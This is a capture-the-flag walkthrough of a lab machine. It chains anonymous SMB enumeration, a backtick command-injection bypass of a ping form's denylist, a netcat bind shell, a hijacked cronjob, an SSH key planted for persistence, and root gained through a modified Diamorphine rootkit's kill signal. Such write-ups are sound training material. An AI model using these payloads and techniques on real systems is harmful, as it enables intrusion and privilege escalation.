Enumeration

Starting with a basic Nmap scan, four ports are exposed: 22 (SSH), 80 (HTTP), 139 and 445 (SMB). The presence of SMB is interesting — I run enum4linux to enumerate shares. 

enum4linux $IP

A share named /public is accessible anonymously. Connecting to it reveals a text file left by an intern. 

cat msg_for_administrator.txt
 
Dear Administrator,
I would like to inform you that a new Ping system is being developed
and I left the corresponding application in a specific path, which can
be accessed through the following address: /myrouterpanel
Yours sincerely,
Athena
Intern

Navigating to /myrouterpanel on port 80 reveals a web-based ping utility — a classic command injection target.

Command injection — initial foothold

The ping form sends user input directly to a shell command. Looking at the server-side code after getting a shell, the filter in place is minimal. 

$maliciousChars = array(';', '&', '|');

Only three characters are blocked. Backticks are not filtered, which allows command substitution to bypass the restriction entirely. Classic reverse shell payloads fail due to network restrictions, so I opt for a bind shell instead. 

`nc -nlvp 1337 -e /bin/sh`

I then connect from my machine and stabilize the shell using Python's PTY module. 

telnet $IP 1337
python3 -c 'import pty; pty.spawn("/bin/bash")'

I land as www-data.

Lateral movement — www-data to athena

Running linpeas.sh for local enumeration, a cronjob catches my eye: a backup script writable by www-data and owned by the athena group. 

-rwxr-xr-x 1 www-data athena 258 May 28 2023 /usr/share/backup/backup.sh

I replace the script content with a reverse shell, set up a Netcat listener, and wait for the cronjob to trigger. The shell comes back as athena.

To get a stable persistent session, I add my public key to /home/athena/.ssh/authorized_keys and reconnect via SSH. 

echo "ssh-rsa AAAA..." >> /home/athena/.ssh/authorized_keys
ssh athena@$IP

Privilege escalation — LKM rootkit signal abuse

Checking sudo permissions reveals something unusual. 

sudo -l
 
(root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko

venom.ko is a Linux kernel module — a rootkit. Its modinfo output confirms it's based on the Diamorphine LKM rootkit by m0nad. The module is already loaded (insmod returns "File exists"), so the rootkit is active.

Diamorphine works by hooking the kill syscall. When a specific magic signal is sent to any process, the rootkit calls give_root() and elevates the process to UID 0. The default signal in the public Diamorphine source is 64 — but this version is modified.

I disassemble the module to find the actual signal comparisons inside hacked_kill. 

objdump -d /mnt/.../secret/venom.ko | grep -A30 "hacked_kill"
 
4ed:   83 f8 39     cmp    $0x39,%eax   ; 0x39 = 57 → give_root
4f2:   83 f8 3f     cmp    $0x3f,%eax   ; 0x3f = 63 → module hide
4f7:   83 f8 1f     cmp    $0x1f,%eax   ; 0x1f = 31 → process hide

The magic signal for give_root is 57 (0x39). Sending it to the current shell process and immediately reading the flag gives root. 

sh -c 'kill -57 $$ && cat /root/root.txt'

Summary

The attack chain was: SMB anonymous share → hidden web path disclosure → command injection via unfiltered backticks → bind shell as www-data → writable cronjob script → lateral move to athena → LKM rootkit signal abuse → root.

The key insight on the rootkit was disassembling hacked_kill directly rather than trusting the default Diamorphine signal. On the command injection side, incomplete denylist filtering (backticks not blocked) is a reliable bypass when common separators are restricted.
